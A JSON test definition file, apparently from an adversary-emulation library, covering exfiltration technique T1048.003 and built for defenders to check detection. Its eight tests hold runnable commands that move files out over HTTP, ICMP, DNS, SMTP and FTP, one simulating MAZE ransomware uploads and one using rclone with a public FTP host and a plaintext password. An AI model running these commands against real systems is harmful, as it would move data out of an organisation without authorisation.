{
  "attack_technique": "T1048.003",
  "display_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
  "atomic_tests": [
    {
      "name": "Exfiltration Over Alternative Protocol - HTTP",
      "description": "A firewall rule (ipfw,pf,iptables or firewalld) will be needed to allow exfiltration on port 1337.\n\nUpon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.",
      "supported_platforms": [
        "macos",
        "linux"
      ],
      "executor": {
        "name": "manual",
        "elevation_required": false,
        "procedure": "1. Victim System Configuration:\n\n    mkdir /tmp/victim-staging-area\n    echo \"this file will be exfiltrated\" > /tmp/victim-staging-area/victim-file.txt\n\n2. Using Python to establish a one-line HTTP server on victim system:\n\n    cd /tmp/victim-staging-area\n    python -m SimpleHTTPServer 1337\n\n3. To retrieve the data from an adversary system:\n\n    wget http://VICTIM_IP:1337/victim-file.txt\n\n\n\n\n\n\n\n<br/>\n<br/>"
      },
      "input_arguments": [],
      "auto_generated_guid": "1d1abbd6-a3d3-4b2e-bef5-c59293f46eff"
    },
    {
      "name": "Exfiltration Over Alternative Protocol - ICMP",
      "description": "Exfiltration of specified file over ICMP protocol.\n\nUpon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"#{ip_address}\", 1500, $Data) }"
      },
      "input_arguments": [
        {
          "arg_name": "input_file",
          "description": "Path to file to be exfiltrated.",
          "type": "path",
          "default": "C:\\Windows\\System32\\notepad.exe"
        },
        {
          "arg_name": "ip_address",
          "description": "Destination IP address where the data should be sent.",
          "type": "string",
          "default": "127.0.0.1"
        }
      ],
      "auto_generated_guid": "dd4b4421-2e25-4593-90ae-7021947ad12e"
    },
    {
      "name": "Exfiltration Over Alternative Protocol - DNS",
      "description": "Exfiltration of specified file over DNS protocol.",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "manual",
        "elevation_required": false,
        "procedure": "1. On the adversary machine run the below command.\n\n    tshark -f \"udp port 53\" -Y \"dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches \\\\\".domain\\\\\"\" >> received_data.txt\n\n2. On the victim machine run the below commands.\n\n    xxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done\n\n3. Once the data is received, use the below command to recover the data.\n\n    cat output_file | cut -d \"A\" -f 2 | cut -d \" \" -f 2 | cut -d \".\" -f 1 | sort | uniq | xxd -p -r\n\n\n\n\n\n\n\n<br/>\n<br/>"
      },
      "input_arguments": [],
      "auto_generated_guid": "c403b5a4-b5fc-49f2-b181-d1c80d27db45"
    },
    {
      "name": "Exfiltration Over Alternative Protocol - HTTP",
      "description": "Exfiltration of specified file over HTTP.\nUpon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "$content = Get-Content #{input_file}\nInvoke-WebRequest -Uri #{ip_address} -Method POST -Body $content"
      },
      "input_arguments": [
        {
          "arg_name": "input_file",
          "description": "Path to file to exfiltrate",
          "type": "path",
          "default": "C:\\Windows\\System32\\notepad.exe"
        },
        {
          "arg_name": "ip_address",
          "description": "Destination IP address where the data should be sent",
          "type": "string",
          "default": "http://127.0.0.1"
        }
      ],
      "auto_generated_guid": "6aa58451-1121-4490-a8e9-1dada3f1c68c"
    },
    {
      "name": "Exfiltration Over Alternative Protocol - SMTP",
      "description": "Exfiltration of specified file over SMTP.\nUpon successful execution, powershell will send an email with attached file to exfiltrate to a remote address. Results will be via stdout.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "Send-MailMessage -From #{sender} -To #{receiver} -Subject \"T1048.003 Atomic Test\" -Attachments #{input_file} -SmtpServer #{smtp_server}"
      },
      "input_arguments": [
        {
          "arg_name": "input_file",
          "description": "Path to file to exfiltrate",
          "type": "path",
          "default": "C:\\Windows\\System32\\notepad.exe"
        },
        {
          "arg_name": "sender",
          "description": "The email address of the sender",
          "type": "string",
          "default": "test@corp.com"
        },
        {
          "arg_name": "receiver",
          "description": "The email address of the receiver",
          "type": "string",
          "default": "test@corp.com"
        },
        {
          "arg_name": "smtp_server",
          "description": "SMTP server to use for email transportation",
          "type": "string",
          "default": "127.0.0.1"
        }
      ],
      "auto_generated_guid": "ec3a835e-adca-4c7c-88d2-853b69c11bb9"
    },
    {
      "name": "MAZE FTP Upload",
      "description": "This test simulates MAZE's ransomware's ability to exfiltrate data via FTP.\nUpon successful execution, all 7z files within the %windir%\\temp directory will be uploaded to a remote FTP server. \nReference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "cleanup_command": "$ftp = \"ftp://#{ftp_server}/\"\ntry {foreach ($file in (dir \"$env:windir\\temp\" \"*.7z\"))\n{$uri = New-Object System.Uri($ftp+$file.name)\n $ftp_del = [System.Net.FtpWebRequest]::create($uri)\n $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}')\n $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile\n $ftp_del.GetResponse()}} catch{}",
        "procedure": "$Dir_to_copy = \"$env:windir\\temp\"\n$ftp = \"ftp://#{ftp_server}/\"\n$web_client = New-Object System.Net.WebClient\n$web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}')\nif (test-connection -count 1 -computername \"#{ftp_server}\" -quiet)\n{foreach($file in (dir $Dir_to_copy \"*.7z\"))\n{echo \"Uploading $file...\"\n$uri = New-Object System.Uri($ftp+$file.name)\n$web_client.UploadFile($uri, $file.FullName)}}\nelse\n{echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\"}"
      },
      "input_arguments": [
        {
          "arg_name": "ftp_server",
          "description": "FTP Server address",
          "type": "string",
          "default": "127.0.0.1"
        },
        {
          "arg_name": "username",
          "description": "Username for FTP server login",
          "type": "string",
          "default": null
        },
        {
          "arg_name": "password",
          "description": "Password for FTP server login",
          "type": "string",
          "default": null
        }
      ],
      "auto_generated_guid": "57799bc2-ad1e-4130-a793-fb0c385130ba"
    },
    {
      "name": "Exfiltration Over Alternative Protocol - FTP - Rclone",
      "description": "Rclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server.\n[Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "procedure": "$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName\n$exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName\n&$rclone_bin config create ftpserver \"ftp\" \"host\" #{ftp_server} \"port\" #{ftp_port} \"user\" #{ftp_user} \"pass\" #{ftp_pass}\n&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate"
      },
      "input_arguments": [
        {
          "arg_name": "ftp_server",
          "description": "Your own ftp server",
          "type": "string",
          "default": "ftp.dlptest.com"
        },
        {
          "arg_name": "ftp_pass",
          "description": "Your FTP user's password",
          "type": "string",
          "default": "rNrKYTX9g7z3RgJRmxWuGHbeu"
        },
        {
          "arg_name": "ftp_user",
          "description": "Your FTP username",
          "type": "string",
          "default": "dlpuser"
        },
        {
          "arg_name": "ftp_port",
          "description": "Your FTP's port",
          "type": "integer",
          "default": "21"
        }
      ],
      "dependencies": [
        {
          "description": "Check if the exfil package exists",
          "prereq_command": "if (Test-Path C:\\Users\\Public\\Downloads\\exfil.zip) {exit 0} else {exit 1}",
          "get_prereq_command": "fsutil file createnew C:\\Users\\Public\\Downloads\\exfil.zip 20485760"
        },
        {
          "description": "Check if rclone zip exists",
          "prereq_command": "if (Test-Path C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip) {exit 0} else {exit 1}",
          "get_prereq_command": "Invoke-WebRequest -Uri \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile \"C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip\"\nExpand-Archive C:\\Users\\Public\\Downloads\\rclone-current-windows-amd64.zip -DestinationPath C:\\Users\\Public\\Downloads\\"
        }
      ],
      "auto_generated_guid": "b854eb97-bf9b-45ab-a1b5-b94e4880c56b"
    },
    {
      "name": "Python3 http.server",
      "description": "An adversary may use the python3 standard library module http.server to exfiltrate data. This test checks if python3 is available and if so, creates a HTTP server on port 9090, captures the PID, sleeps for 10 seconds, then kills the PID and unsets the $PID variable.",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": false,
        "procedure": "[ \"$(uname)\" = 'FreeBSD' ] && alias python3=python3.9\nif [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi"
      },
      "input_arguments": [],
      "auto_generated_guid": "3ea1f938-f80a-4305-9aa8-431bc4867313"
    }
  ]
}